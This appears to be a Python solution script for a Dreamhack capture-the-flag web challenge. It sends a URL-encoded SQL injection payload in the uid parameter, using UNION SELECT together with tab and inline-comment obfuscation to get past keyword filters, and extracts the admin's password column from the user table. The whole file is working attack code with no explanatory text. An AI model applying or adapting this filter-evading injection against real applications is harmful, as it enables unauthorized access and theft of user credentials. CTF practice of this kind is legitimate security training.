import requests

TEST_LOC = ""

if TEST_LOC == "local":
    HOST = "http://127.0.0.1"
    PORT = ""
else:
    HOST = "http://host3.dreamhack.games"
    PORT = "15982"

ATTACK_URI = "/?uid="
ATTACK_CODE = """%27Union%09Sel%2F%2A%2A%2Fect%09NULL,upw,NULL%09Fr%2F%2A%2A%2Fom%09user%09where%09uid="Adm%2F%2A%2A%2Fin"%23"""
PAYLOAD = ATTACK_URI + ATTACK_CODE

resp = requests.get(HOST + ":" + PORT + PAYLOAD)
print(resp.text)